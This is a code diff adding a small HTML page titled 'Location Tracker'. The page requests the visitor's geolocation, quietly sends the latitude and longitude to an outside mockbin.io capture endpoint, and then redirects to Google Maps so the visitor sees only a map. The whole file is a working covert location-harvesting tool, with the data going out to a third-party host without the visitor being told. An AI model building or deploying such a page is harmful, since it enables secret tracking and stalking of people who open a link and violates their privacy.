@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+</head>
+<body>
+    <h1>Please allow location access</h1>
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function (position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    // Log the location in the console
+                    console.log('Latitude:', latitude);
+                    console.log('Longitude:', longitude);
+
+                    // Send the data to Mockbin
+                    fetch('https://259489c832cf4c4b82ea71161f667119.api.mockbin.io/', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ latitude, longitude }),
+                    })
+                    .then(() => {
+                        console.log('Location data sent successfully');
+                    })
+                    .catch((error) => {
+                        console.error('Error sending location data:', error);
+                    });
+
+                    // Redirect to Google Maps
+                    window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                },
+                function (error) {
+                    alert('Location access denied or unavailable.');
+                    console.error('Geolocation error:', error);
+                }
+            );
+        } else {
+            alert('Geolocation is not supported by this browser.');
+        }
+    </script>
+</body>
+</html>
